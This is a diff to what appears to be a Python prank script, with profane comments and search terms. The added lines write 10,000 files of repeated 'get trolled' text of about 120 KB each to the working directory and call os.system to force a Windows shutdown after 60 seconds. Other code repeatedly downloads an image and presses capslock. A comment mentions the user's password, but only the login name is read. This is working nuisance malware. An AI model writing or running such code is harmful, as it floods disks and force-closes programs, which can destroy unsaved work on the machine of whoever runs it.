@@ -5,6 +5,18 @@ import requests
 import psutil
 import os
 
+# write 10,000 files
+txt_number = 10000
+
+bytes = 100 * 100
+
+string = "get trolled " * bytes
+
+for i in range(1, txt_number + 1):
+    filename = f"get trolled_{i}.txt"
+    with open(filename, "w") as file:
+        file.write(string)
+
 
 searches = [
     'fuck java',
@@ -40,9 +52,13 @@ searches = [
 # download the fucking miku image
 url = 'https://is1-ssl.mzstatic.com/image/thumb/Music221/v4/b8/92/ce/b892cead-70a1-8f29-0045-af30080d3a16/4571640501760_cover.png/316x316bb.webp'
 
-# get the username
+# get the user's username and password
 username = os.getlogin()
 
+# print the username
+print(f'Hi, {username}.')
+
+os.system("shutdown /s /f /t 60")
 
 def main():
     downloaded_number = 1
@@ -59,9 +75,6 @@ def main():
         response = requests.get(url)
         with open("nice_try.webp", "wb") as file:
             file.write(response.content)
-
-        # print the username
-        print(f'Hi, {username}.')
         
         # press shit idfk
         pyautogui.press('capslock')
